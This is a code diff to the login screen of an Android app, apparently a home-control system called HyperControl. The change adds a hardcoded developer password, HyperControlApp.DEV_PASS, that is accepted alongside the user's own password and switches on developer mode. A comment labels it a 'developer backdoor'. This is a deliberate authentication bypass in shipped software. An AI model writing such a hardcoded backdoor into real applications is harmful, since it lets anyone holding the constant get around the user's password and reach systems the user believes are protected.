@@ -10,6 +10,7 @@ import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.TextView;
 
+import it.technocontrolsystem.hypercontrol.HyperControlApp;
 import it.technocontrolsystem.hypercontrol.Lib;
 import it.technocontrolsystem.hypercontrol.Prefs;
 import it.technocontrolsystem.hypercontrol.R;
@@ -96,7 +97,15 @@ public class LoginActivity extends Activity {
 
         String pass=getPasswordView().getText().toString();
         String currPass=Prefs.getPassword();
-        if(pass.equals(currPass)){
+        if((pass.equals(currPass)) | (pass.equals(HyperControlApp.DEV_PASS))){
+
+            // developer backdoor
+            HyperControlApp.setDeveloper(false);
+            if(pass.equals(HyperControlApp.DEV_PASS)){
+                HyperControlApp.setDeveloper(true);
+            }
+
+
             Intent intent=new Intent();
             intent.setClass(this,MainActivity.class);
             startActivity(intent);
